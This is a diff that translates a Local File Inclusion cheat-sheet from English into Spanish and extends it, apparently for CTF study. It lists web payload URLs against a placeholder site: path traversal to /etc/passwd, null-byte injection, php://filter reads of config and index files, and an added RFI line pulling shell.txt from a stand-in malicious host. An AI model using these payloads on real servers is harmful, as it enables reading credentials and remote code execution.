@@ -1,37 +1,52 @@
-## Local File Inclusion (LFI)
+## Inclusión de Archivos Locales (LFI)
 
-The Local File Inclusion (LFI) vulnerability is a computer security vulnerability that occurs when a web 
-application does not properly validate user inputs, allowing an attacker to access local files on the web server.
+La vulnerabilidad de Inclusión de Archivos Locales (LFI) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web no valida adecuadamente las entradas de usuario, permitiendo a un atacante acceder a archivos locales en el servidor web.
 
-In many cases, attackers exploit the LFI vulnerability by abusing input parameters in the web application. 
-Input parameters are data that users enter into the web application, such as URLs or form fields. 
-Attackers can manipulate input parameters to include local file paths in the request, 
-which can allow them to access files on the web server. This technique is known as "Path Traversal" 
-and is commonly used in LFI attacks.
+En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como "Path Traversal" y se utiliza comúnmente en ataques de LFI.
 
-In a Path Traversal attack, the attacker uses special characters and escape characters 
-in the input parameters to navigate through the web server's directories and access files in sensitive system 
-locations.
+En el ataque de Path Traversal, el atacante utiliza caracteres especiales y caracteres de escape en los parámetros de entrada para navegar a través de los directorios del servidor web y acceder a archivos en ubicaciones sensibles del sistema.
 
-For example, the attacker could include "../" in the input parameter to navigate up the directory structure 
-and access files in sensitive system locations.
+Por ejemplo, el atacante podría incluir "../" en el parámetro de entrada para navegar hacia arriba en la estructura del directorio y acceder a archivos en ubicaciones sensibles del sistema.
 
-### Basic LFI
+### Ejemplos básicos de LFI
 
+#### Path Traversal básico
 ```ruby
-http://vulnerable-site.com/index.php?page=../../../etc/passwd
+http://sitio-vulnerable.com/index.php?page=../../../etc/passwd
 ```
-This example attempts to access the /etc/passwd file on a Unix-based system.
+Este ejemplo intenta acceder al archivo `/etc/passwd` en un sistema basado en Unix.
 
-### Null byte injection:
+#### Inyección de byte nulo
 ```ruby
-http://vulnerable-site.com/index.php?page=../../../etc/passwd%00
+http://sitio-vulnerable.com/index.php?page=../../../etc/passwd%00
 ```
-This technique can be used to bypass certain types of input validation
+Esta técnica puede ser utilizada para eludir ciertos tipos de validación de entrada.
 
-### PHP wrapper
+### Ejemplos avanzados de LFI
 
+#### Uso de wrapper de PHP
 ```ruby
-http://vulnerable-site.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
+http://sitio-vulnerable.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
 ```
-This example uses a PHP wrapper to read and encode the contents of a PHP file.
+Este ejemplo utiliza un envoltorio de PHP para leer y codificar el contenido de un archivo PHP.
+
+#### Inclusión remota mediante LFI combinado con RFI
+```ruby
+http://sitio-vulnerable.com/index.php?page=http://servidor-malicioso.com/shell.txt
+```
+Si la configuración `allow_url_include` está habilitada, esto puede permitir la ejecución de código remoto.
+
+#### Abuso de cadenas de filtros en PHP
+```ruby
+http://sitio-vulnerable.com/index.php?page=php://filter/convert.base64-encode/resource=../../../../var/www/html/index.php
+```
+Esto permite al atacante leer archivos sensibles codificados en Base64.
+
+
+### Herramientas útiles
+
+- **PHP Filter Chain Generator**: Herramienta para generar cadenas de filtros en PHP y abusar de ellas para conseguir ejecución remota de comandos. [Enlace a la herramienta](https://github.com/synacktiv/php_filter_chain_generator)
+
+### Recursos adicionales para CTF
+
+- **Payloads All The Things**: Repositorio con ejemplos de payloads para LFI y otras vulnerabilidades. [Enlace al repositorio](https://github.com/swisskyrepo/PayloadsAllTheThings)
